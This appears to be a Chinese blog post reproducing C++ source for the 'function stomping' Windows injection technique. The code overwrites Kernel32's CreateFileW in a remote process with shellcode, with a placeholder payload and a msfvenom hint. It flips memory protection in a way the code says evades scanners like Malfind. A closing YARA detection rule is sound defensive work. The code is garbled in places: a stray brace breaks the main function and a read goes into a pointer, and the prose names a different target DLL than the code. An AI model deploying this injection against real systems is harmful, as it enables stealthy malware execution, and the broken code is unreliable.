**一、看代码：**

#include"functionstomping.hpp"

  

int main() {

// Just get the pid in any way and pass it to the function.

DWORD pid = 3110;

FunctionStomping(pid);

return 0;

}

  

//functionstomping.hpp  

#include <iostream>

#include <Windows.h>

#include <Psapi.h>

#include <Shlwapi.h>

  

#pragma comment(lib, "Shlwapi.lib")

  

BYTE\* GetFunctionBase(HANDLE procHandle, const wchar\_t\* moduleName, const char\* functionName);

  

// msfvenom -p windows/x64/exec CMD=calc.exe -a x64 -b "x00" -f c

unsigned char shellcode\[\] = "XXXXX";

  

int FunctionStomping(DWORD pid)

{

    DWORD oldPermissions;

    HANDLE procHandle = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, pid);

 }  

  

    // Getting the remote module base.

    BYTE\* functionBase = GetFunctionBase(procHandle, L"Kernel32.dll", "CreateFileW");

  

    // Verifying that the shellcode isn't too big.

    SIZE\_T sizeToWrite = sizeof(shellcode);

    BYTE\* oldFunction;

    

 ReadProcessMemory(procHandle, functionBase, &oldFunction, sizeToWrite, NULL);

  

    // Changing the protection to READWRITE to write the shellcode.

VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE\_EXECUTE\_READWRITE, &oldPermissions);

  

    SIZE\_T written;

  

    // Writing the shellcode to the remote process.

WriteProcessMemory(procHandle, functionBase, shellcode, sizeof(shellcode), &written);

  

    // Changing the protection to WCX to evade injection scanners like Malfind: https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners.

VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE\_EXECUTE\_WRITECOPY, &oldPermissions);

}

  

BYTE\* GetFunctionBase(HANDLE procHandle, const wchar\_t\* moduleName, const char\* functionName) {

    BOOL res;

    DWORD moduleListSize;

    BYTE\* functionBase = NULL;

  

    // Getting the size to allocate.

    res = EnumProcessModules(procHandle, NULL, 0, &moduleListSize);

  

    // Getting the module list.

    HMODULE\* moduleList = (HMODULE\*)malloc(moduleListSize);

  

    // Iterating the modules of the process.

    for (HMODULE\* modulePtr = &moduleList\[0\]; modulePtr < &moduleList\[moduleListSize / sizeof(HMODULE)\]; modulePtr++) {

        HMODULE currentModule = \*modulePtr;

        wchar\_t currentModuleName\[MAX\_PATH\];

        memset(currentModuleName, 0, MAX\_PATH);

  

        // Getting the module name.

        if (GetModuleFileNameEx(procHandle, currentModule, currentModuleName, MAX\_PATH - sizeof(wchar\_t)) == 0) {

            std::cerr << "\[-\] Failed to get module name: " << GetLastError() << std::endl;

            continue;

        }

  

        // Checking if it is the module we seek.

        if (StrStrI(currentModuleName, moduleName) != NULL) {

            

            functionBase = (BYTE\*)GetProcAddress(currentModule, functionName);

            break;

        }

    }

  

    free(moduleList);

    return functionBase;

}

  
代码不长，能看懂。核心思路就是：指定某个进程，“掏空”进程中Kernel32的CreateFileW函数，将shellcode写入到这片内存中。看到“掏空”这个词，我就想到动物界的鬣狗“掏肛”，这种感觉很不好，很难受，很残忍。没想到在技术界有人这么做，其实想想也没什么，在inline hook中不都有5字节大法吗？为什么那个没有引起不适呢，不都是偷梁换柱手法吗？难道是“掏空”这个词的错。

  

**二、一些研究**

**注：这是作者的一些研究，有助于理解代码中的精髓。**

  

1、一般流程  

    对于所有注入方法，您需要使用PROCESS\_ALL\_ACCESS权限打开一个进程。因为注入需要执行高权限操作，例如写入进程的内存并远程执行shellcode。

  
    在我们获得具有正确权限的有效句柄后，我们需要使用 VirtualAllocEx为远程进程虚拟内存中的shellcode分配空间。这为我们提供了编写shellcode所需的空间和地址。在我们拥有一个具有正确权限和足够空间的页面后，我们可以使用 WriteProcessMemory将shellcode写入远程进程。  
  
    现在，剩下要做的就是使用shellcode的地址（我们从 VirtualAllocEx获得）调用CreateRemoteThread，以在另一个进程中生成我们的shellcode。

2、研究

为了POC，选择以User32.dll和MessageBoxW为目标。但是，与使用GetModuleHandle的常规方式不同，需要远程操作。为此，使用了EnumProcessModules函数：

![](../Images/1d11988588c2a3eab15d9cd4a50efe24.png)

它看起来是一个非常简单的函数，现在需要做的就是使用旧的GetProcAddress。实现非常简单：使用GetModuleFileName从句柄中获取模块的名称，然后如果它是我们寻找的模块（当前为User32.dll）。如果是，只需使用GetProcAddress并获取函数的基地址。

    为什么Kernel32.dll而不是另一个DLL，原因是Kernel32.dll总是加载任何文件，因此是一个可靠的目标。

4、检测

因为许多反病毒未能将这种 shellcode 注入技术识别为恶意，所以我添加了一个我编写的YARA签名，以便您可以将其导入到您自己的防御工具中。

/\*

    A rule to detect functionstomping based on imports.

    Author: Ido Veltzman (Idov31)

    Date: 28-01-2022

\*/

  

rule FunctionStomping {

    meta:

        description = "A rule to detect functionstomping."

        author = "Idov31"

        date = "2022-01-28"

    strings:

        $s0 = "OpenProcess" ascii

        $s1 = "EnumProcessModules" fullword ascii

        $s2 = "GetModuleFileName" ascii

        $s3 = "GetProcAddress" fullword ascii

        $s4 = "VirtualProtect" ascii

        $s5 = "WriteProcessMemory" fullword ascii

  

    condition:

        uint16(0) == 0x5A4D and all of ($s\*)

}
